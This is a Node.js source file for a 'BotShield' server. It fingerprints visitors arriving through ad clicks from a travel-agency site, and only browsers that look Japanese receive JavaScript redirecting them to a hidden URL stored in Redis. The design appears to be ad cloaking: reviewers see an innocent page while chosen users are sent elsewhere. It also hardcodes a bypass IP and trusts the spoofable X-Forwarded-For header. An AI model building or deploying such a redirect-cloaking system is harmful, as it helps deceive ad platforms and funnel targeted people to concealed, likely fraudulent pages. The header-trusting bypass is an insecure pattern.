require("dotenv").config();
const http = require("http");
const url = require("url");
const crypto = require("crypto");
const Redis = require("ioredis");

const PORT = process.env.PORT || 3000;

const ALLOWED_ORIGINS = [
  "https://ayakotravelagency.d2fwxw2q4n4zt.amplifyapp.com",
];

const TEST_BYPASS_IP = "45.151.152.118";

// Shared with the admin server — the presigned URL it last published.
const KEY_CURRENT_URL = "current:url";

const redis = new Redis(process.env.REDIS_LINK_UPDATION_URL);
redis.on("error", (err) => console.error("Redis error:", err.message));

function checkOrigin(req) {
  // The Origin header is set automatically by browsers on cross-origin
  // requests (CORS preflight and actual POST). Referer is a fallback.
  const origin = (req.headers["origin"] || "").replace(/\/+$/, "");
  const referer = req.headers["referer"] || "";

  // If no origin header at all, check referer
  let effectiveOrigin = origin;
  if (!effectiveOrigin && referer) {
    try {
      const parsed = new URL(referer);
      effectiveOrigin = parsed.origin; // scheme + host + port
    } catch (_) {}
  }

  if (!effectiveOrigin) {
    return {
      allowed: false,
      origin: null,
      reason:
        "No Origin or Referer header present — likely a direct/scripted request",
    };
  }

  const normalised = effectiveOrigin.replace(/\/+$/, "").toLowerCase();
  const isAllowed = ALLOWED_ORIGINS.some(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === normalised,
  );

  return {
    allowed: isAllowed,
    origin: effectiveOrigin,
    reason: isAllowed
      ? "Origin allowed"
      : `Origin "${effectiveOrigin}" is not in the allow-list`,
  };
}

function buildRedirectJS(redirectURL) {
  if (!redirectURL) return "";
  return `window.location.replace(${JSON.stringify(redirectURL)});`;
}

async function getCurrentRedirectURL() {
  try {
    return await redis.get(KEY_CURRENT_URL);
  } catch (err) {
    console.error("Redis GET failed:", err.message);
    return null;
  }
}

function verify(fp, ip) {
  const results = [];
  const critical = []; // must-pass

  // ─── 3. Japan Locale / Timezone ─────────────────────────────
  (function checkJapan() {
    const tz = (fp.timezone || "").toLowerCase();
    const lang = (fp.language || "").toLowerCase();
    const langs = (fp.languages || []).map((l) => l.toLowerCase());

    // All known IANA timezone identifiers that map to JST (UTC+9 / Japan):
    //   • "Asia/Tokyo"  — canonical IANA identifier
    //   • "Japan"       — backward-compatibility alias (IANA 'backward' file links Japan → Asia/Tokyo)
    //   • "Etc/GMT-9"   — fixed UTC+9 offset (IANA uses inverted sign convention in Etc/)
    //   • "Etc/GMT-09"  — some implementations zero-pad the offset
    //   • "JST"         — abbreviation used by some systems (e.g. older Java, some Linux configs)
    //   • "JST-9"       — POSIX-style TZ string for Japan Standard Time
    const JAPAN_TIMEZONES = new Set([
      "asia/tokyo",
      "japan",
      "etc/gmt-9",
      "etc/gmt-09",
      "jst",
      "jst-9",
    ]);

    const isJapanTz = JAPAN_TIMEZONES.has(tz);
    // JST = UTC+9 → offset = -540
    const isJapanOffset = fp.timezoneOffset === -540;
    const hasJaLang =
      lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));

    // Japanese fonts presence is a strong secondary signal
    const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
    const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));

    // We require timezone match AND at least one language/font signal
    const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);

    critical.push({
      name: "japan_locale",
      pass,
      reason: pass
        ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
        : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
    });
  })();

  const criticalFail = critical.find((c) => !c.pass);
  if (criticalFail) {
    return {
      verified: false,
      reason: `Critical check failed: ${criticalFail.name} — ${criticalFail.reason}`,
      checks: [...critical, ...results],
    };
  }

  // Soft score (all critical passed)
  const totalWeight = results.reduce((s, r) => s + r.weight, 0);
  const earnedWeight = results
    .filter((r) => r.pass)
    .reduce((s, r) => s + r.weight, 0);
  const score = totalWeight > 0 ? (earnedWeight / totalWeight) * 100 : 100;

  const THRESHOLD = 60;
  return {
    verified: score >= THRESHOLD,
    score: Math.round(score),
    reason:
      score >= THRESHOLD
        ? "Passed"
        : `Score ${Math.round(score)}% below threshold ${THRESHOLD}%`,
    checks: [...critical, ...results],
  };
}

const server = http.createServer(async (req, res) => {
  // ── Dynamic CORS: only reflect allowed origins ─────────────
  const reqOrigin = (req.headers["origin"] || "")
    .replace(/\/+$/, "")
    .toLowerCase();
  const matchedOrigin = ALLOWED_ORIGINS.find(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === reqOrigin,
  );
  // Extract IP early for test bypass CORS handling
  let _earlyIP =
    req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (_earlyIP.includes(",")) _earlyIP = _earlyIP.split(",")[0].trim();
  _earlyIP = _earlyIP.replace(/^::ffff:/, "");
  const _isTestBypass = _earlyIP === TEST_BYPASS_IP;

  if (matchedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
  } else if (_isTestBypass && req.headers["origin"]) {
    res.setHeader("Access-Control-Allow-Origin", req.headers["origin"]);
  }
  // Never send wildcard — only the matched origin gets reflected
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Vary", "Origin");

  if (req.method === "OPTIONS") {
    res.writeHead(matchedOrigin || _isTestBypass ? 204 : 403);
    return res.end();
  }

  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/verify" && req.method === "POST") {
    // ── Extract client IP early (needed for test bypass) ──────
    let earlyIP =
      req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (earlyIP.includes(",")) earlyIP = earlyIP.split(",")[0].trim();
    earlyIP = earlyIP.replace(/^::ffff:/, "");

    // ── TEST BYPASS: skip origin gate for test IP ─────────────
    const isTestBypass = earlyIP === TEST_BYPASS_IP;

    // ── Origin gate: reject requests from unknown origins ────
    const originCheck = checkOrigin(req);
    if (!originCheck.allowed && !isTestBypass) {
      console.log(`\n🚫 ORIGIN REJECTED: ${originCheck.reason}`);
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          verified: false,
          reason: `Origin not allowed: ${originCheck.reason}`,
        }),
      );
    }

    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { fingerprint, gclid, source, ts: clientTs } = JSON.parse(body);
        // ── Get the Clean Client IP ───────────────────────────
        let clientIP =
          req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
        if (clientIP.includes(",")) {
          clientIP = clientIP.split(",")[0].trim();
        }
        clientIP = clientIP.replace(/^::ffff:/, "");
        // ──────────────────────────────────────────────────────

        console.log("\n══════════════════════════════════════════════");
        console.log(
          `[${new Date().toISOString()}] Verification request from ${clientIP}`,
        );
        console.log(`  Source: ${source}  |  Client TS: ${clientTs}`);
        console.log(`  GCLID: ${gclid ? gclid.slice(0, 20) + "…" : "(none)"}`);

        // ── TEST BYPASS: skip all checks for the test IP ──────
        if (clientIP === TEST_BYPASS_IP) {
          console.log(
            `  🔓 TEST BYPASS — IP ${clientIP} matches test IP, skipping all checks`,
          );
          const redirectURL = await getCurrentRedirectURL();
          console.log("══════════════════════════════════════════════\n");
          res.writeHead(200, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: true,
              reason: "Test bypass",
              code: buildRedirectJS(redirectURL),
            }),
          );
        }

        const result = verify(fingerprint, clientIP);

        console.log(
          `  FP result: ${result.verified ? "✅ VERIFIED" : "❌ REJECTED"} (score: ${result.score ?? "N/A"})`,
        );
        if (!result.verified) {
          console.log(`  Reason: ${result.reason}`);
        }
        for (const c of result.checks) {
          console.log(`    ${c.pass ? "✓" : "✗"} ${c.name}: ${c.reason}`);
        }

        // ── 5. If all passed → record visit & return code ─────
        // if (result.verified) {
        //   await recordVerifiedVisit(gclid, clientIP);
        //   console.log(`  📝 Recorded gclid + IP in Redis`);
        // }

        console.log("══════════════════════════════════════════════\n");

        const response = {
          verified: result.verified,
          reason: result.reason,
        };

        if (result.verified) {
          const redirectURL = await getCurrentRedirectURL();
          response.code = buildRedirectJS(redirectURL);
          if (!redirectURL) {
            console.log(`  ⚠️  No current:url in Redis — returning empty code`);
          }
        }

        res.writeHead(result.verified ? 200 : 403, {
          "Content-Type": "application/json",
        });
        res.end(JSON.stringify(response));
      } catch (err) {
        console.error("[BotShield] Parse error:", err.message);
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ verified: false, reason: "Bad request" }));
      }
    });
    return;
  }

  // Health check
  if (parsed.pathname === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "ok", uptime: process.uptime() }));
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(PORT, () => {
  console.log(`\n🛡️  BotShield verification server running on port ${PORT}`);
  console.log(`   POST /verify  — fingerprint verification endpoint`);
  console.log(`   GET  /health  — health check`);
  console.log(`\n   Allowed origins:`);
  for (const o of ALLOWED_ORIGINS) console.log(`     • ${o}`);
  console.log("");
});
